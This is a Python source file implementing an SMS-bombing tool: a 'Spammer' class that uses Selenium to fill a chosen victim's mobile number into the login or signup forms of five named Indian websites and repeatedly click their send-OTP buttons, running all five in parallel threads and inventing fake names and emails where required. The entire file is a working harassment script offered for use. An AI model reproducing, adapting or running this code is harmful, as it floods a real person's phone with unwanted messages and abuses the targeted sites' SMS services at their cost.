from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import os
import time
import random
import string
from threading import Thread


class Spammer:

    chrome_options = Options()
    path = os.getcwd() + r"\chromedriver.exe"

    def __init__(self, mobile, count, seconds, headless=False):
        self.mobile_no = mobile
        self.bomb_count = round(int(count))
        self.spam_count = 0
        self.delay = float(seconds)
        if headless:
            Spammer.chrome_options.add_argument("--headless")

    def redbus_blast(self):
        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
        driver.get("https://www.redbus.in/account?pageName=Home&noReload=noReload")

        i = 0
        while self.spam_count <= self.bomb_count:
            mobile_input = driver.find_element_by_id("mobileNoInp")
            mobile_input.clear()
            mobile_input.send_keys(self.mobile_no)

            element = driver.find_element_by_class_name("otpContainer")
            driver.execute_script("arguments[0].click();", element)

            element = driver.find_element_by_class_name("resendOtpContainer")
            driver.execute_script("arguments[0].click();", element)

            driver.refresh()
            self.spam_count += 1
            self.bomb_count -= 1
            i += 1

            time.sleep(self.delay)

        print(i)
        driver.close()

    def hike_blast(self):
        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
        driver.get("https://hike.in/")

        i = 0
        while self.spam_count <= self.bomb_count:
            mobile_input = driver.find_element_by_id("number-input")
            mobile_input.clear()
            mobile_input.send_keys(self.mobile_no)

            button = driver.find_element_by_xpath("//div[@onclick='sendSMS(this)']")
            driver.execute_script("arguments[0].click();", button)

            driver.refresh()
            self.spam_count += 1
            self.bomb_count -= 1
            i += 1
            time.sleep(self.delay)

        print(i)
        driver.close()

    def biryani_blast(self):
        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
        driver.get("https://www.behrouzbiryani.com/bb-login")

        random_string = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
        name = random_string
        email = random_string + "@ggwp.xxx"

        i = 0
        while self.spam_count <= self.bomb_count:
            mobile_input = driver.find_element_by_id("mobileno")
            mobile_input.clear()
            mobile_input.send_keys(self.mobile_no)

            name_input = driver.find_element_by_id("customer_name")
            name_input.clear()
            name_input.send_keys(name)

            email_input = driver.find_element_by_id("email_id")
            email_input.clear()
            email_input.send_keys(email)

            button = driver.find_element_by_id("send_otp_register")
            driver.execute_script("arguments[0].click();", button)

            driver.refresh()
            self.spam_count += 1
            self.bomb_count -= 1
            i += 1

            time.sleep(self.delay)

        print(i)
        driver.close()

    def yatra_blast(self):
        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
        driver.get("https://secure.yatra.com/social/common/yatra/register")

        i = 0
        while self.spam_count <= self.bomb_count:
            mobile_input = driver.find_element_by_id("login-input")
            mobile_input.clear()
            mobile_input.send_keys(self.mobile_no)

            button = driver.find_element_by_id("login-continue-btn")
            driver.execute_script("arguments[0].click();", button)

            driver.refresh()
            self.spam_count += 1
            self.bomb_count -= 1
            i += 1

            time.sleep(self.delay)

        print(i)
        driver.close()

    def treebo_blast(self):
        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
        driver.get("https://www.treebo.com/login/")

        i = 0
        while self.spam_count <= self.bomb_count:
            mobile_input = driver.find_element_by_id("mobile")
            mobile_input.clear()
            mobile_input.send_keys(self.mobile_no)

            button = driver.find_element_by_id("verify")
            driver.execute_script("arguments[0].click();", button)

            driver.refresh()
            self.spam_count += 1
            self.bomb_count -= 1
            i += 1

            time.sleep(self.delay)

        print(i)
        driver.close()

    def spam(self):
        t1 = Thread(target=self.hike_blast, args=[])
        t2 = Thread(target=self.redbus_blast, args=[])
        t3 = Thread(target=self.biryani_blast, args=[])
        t4 = Thread(target=self.yatra_blast, args=[])
        t5 = Thread(target=self.treebo_blast, args=[])
        t1.start()
        t2.start()
        t3.start()
        t4.start()
        t5.start()
